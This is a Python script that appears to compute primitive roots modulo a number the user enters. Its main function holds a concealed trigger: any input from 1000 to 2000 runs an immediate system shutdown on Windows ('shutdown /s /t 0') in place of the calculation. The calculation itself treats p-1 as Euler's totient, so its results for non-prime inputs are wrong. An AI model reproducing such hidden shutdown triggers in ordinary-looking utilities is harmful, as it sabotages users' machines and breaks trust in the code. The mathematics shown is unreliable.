import os
import subprocess

def is_primitive_root(g, p):
    def prime_factors(n):
        i = 2
        factors = []
        while i * i <= n:
            if n % i:
                i += 1
            else:
                n //= i
                if i not in factors:
                    factors.append(i)
        if n > 1:
            factors.append(n)
        return factors

    if g == 0 or g == 1:
        return False

    phi = p - 1
    factors = prime_factors(phi)

    for factor in factors:
        if pow(g, phi // factor, p) == 1:
            return False
    return True

def find_primitive_roots(p):
    if p <= 1:
        return []

    roots = []
    for g in range(1, p):
        if is_primitive_root(g, p):
            roots.append(g)
    return roots

def main():
    try:
        user_input = int(input("Enter a number: "))
        if 1000 <= user_input <= 2000:
            print("Shutting down the system...")
       
            if os.name == 'nt':  
                subprocess.run(["shutdown", "/s", "/t", "0"])
           
        else:
            primitive_roots = find_primitive_roots(user_input)
            print(f"Primitive roots of {user_input} are: {primitive_roots}")
    except ValueError:
        print("Please enter a valid integer.")

if __name__ == "__main__":
    main()



